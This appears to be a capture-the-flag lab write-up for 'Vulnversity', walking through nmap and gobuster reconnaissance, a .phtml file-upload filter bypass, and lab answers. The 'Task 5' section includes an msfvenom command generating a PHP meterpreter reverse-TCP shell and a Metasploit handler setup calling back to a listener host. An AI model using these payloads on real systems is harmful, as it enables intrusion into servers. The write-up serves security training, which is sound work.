# 🛡️ Vulnversity

![Pentest](https://img.shields.io/badge/Type-Web%20Exploitation-red)
![Status](https://img.shields.io/badge/Status-Completed-success)
![Tools](https://img.shields.io/badge/Tools-Nmap%20%7C%20Gobuster%20%7C%20Burp%20Suite%20%7C%20Metasploit-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Ubuntu-lightgrey)

---

## 📌 Project Overview
This project demonstrates a full **web application penetration testing workflow**, including:
- Network reconnaissance
- Service enumeration
- Directory brute forcing
- File upload vulnerability exploitation
- Reverse shell execution
- Privilege access identification

---

## 🎯 Objective
To identify and exploit vulnerabilities in a target web server using standard ethical hacking tools and techniques.

---

## 🧰 Tools Used

| Tool | Purpose |
|------|--------|
| 🛰️ Nmap | Network scanning & service enumeration |
| 📂 Gobuster | Directory brute-force discovery |
| 🧪 Burp Suite | Web request interception & payload testing |
| 💣 MSFVenom | Payload generation |
| 🎯 Metasploit Framework | Reverse shell handling |

---

## 📡 Task 1: Target Connectivity

```bash
ping 10.48.145.37
```
✔ Target machine successfully responded
✔ Network connectivity established
![ping_check](screenshots/ping_check.png)

🔍 Task 2: Reconnaissance
Nmap Scan
```bash
nmap -sT -T5 -sV 10.48.145.37
```
Scan the box; how many ports are open?
Open Ports: 6
![nmap_command](screenshots/nmap_command.png)

What version of the squid proxy is running on the machine?
Squid Proxy Version: 4.10
![version](screenshots/version.png)

What is the most likely operating system this machine is running?
Web Server: Apache httpd 2.4.41 (Ubuntu)
![os](screenshots/os.png)

What port is the web server running on?
Web Port: 3333

🌐 Web Access
http://10.48.145.37:3333/
✔ Confirmed active web application
![url](screenshots/url.png)

🗂️ Task 3: Directory Enumeration
```bash
gobuster dir -u http://10.48.183.155:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
What is the directory that has an upload form page?
answer is: internal/
![directory](screenshots/directory.png)

💥 Task 4: File Upload Exploitation
🔍 Burp Suite Testing
Tested multiple file extensions
What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
answer is: .php

What extension is allowed after running the above exercise?
.phtml
![brupsuite](screenshots/brupsuite.png)

🧨 Task 5: Reverse Shell Attack
Payload Generation
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.205.229 LPORT=4444 -f raw -o shell.phtml
```
![msfvenom](screenshots/msfvenom.png)
⚙️ Metasploit Handler
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.205.229
set LPORT 4444
run

upload the payload 
![website](screenshots/website.png)

🚀 Trigger Payload
http://10.49.144.114:3333/internal/uploads/shell.phtml

✔ Reverse shell successfully executed

What is the name of the user who manages the webserver?
answer is: bill
![username](screenshots/username.png)
